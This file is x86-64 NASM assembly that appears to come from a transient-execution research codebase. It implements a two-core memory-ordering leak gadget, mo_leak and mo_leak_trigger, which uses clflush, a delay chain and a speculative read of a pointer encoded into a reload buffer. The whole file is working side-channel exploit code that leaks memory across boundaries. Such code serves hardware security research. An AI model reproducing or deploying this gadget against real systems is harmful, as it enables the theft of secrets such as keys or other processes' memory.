%include "common.S"

%define MO_OFF  

section .data noexec write
    align 256
    trigger:    dq  0x0

    align 256
    x:          dq  0x0
    
    align 256
    y:          dq  0x0

    align 256
    arch_val    dq  0xff


section .text
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; mo_leak_trigger(void)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global mo_leak_trigger
mo_leak_trigger:
    GET_LOCK   trigger 
    lea     rax, [arch_val]
    mov     qword [y], rax   ;Architectural y ptr
    sfence
    ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; mo_leak(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global mo_leak
mo_leak:
    push    r15
    lea     r15, [x]

    ;setup
    clflush [x]             ;slow x
    mov     qword [y], rsi  ;fast y
    SERIALIZE

    ;ensure that store loop is in busy waiting
mo_leak_ensure:
    cmp     dword [trigger], 0
    je      mo_leak_go
    pause
    jmp     mo_leak_ensure

mo_leak_go:
    RELEASE_LOCK    trigger     ;Trigger the other core to perform the store on y

    %rep 150
    imul r15, 1
    %endrep
    mov     rdx, qword  [r15]   ;slow x read
    mov     rax, qword  [y]     ;fast y read
    LEAK    rdi, rax 

    pop     r15
    ret
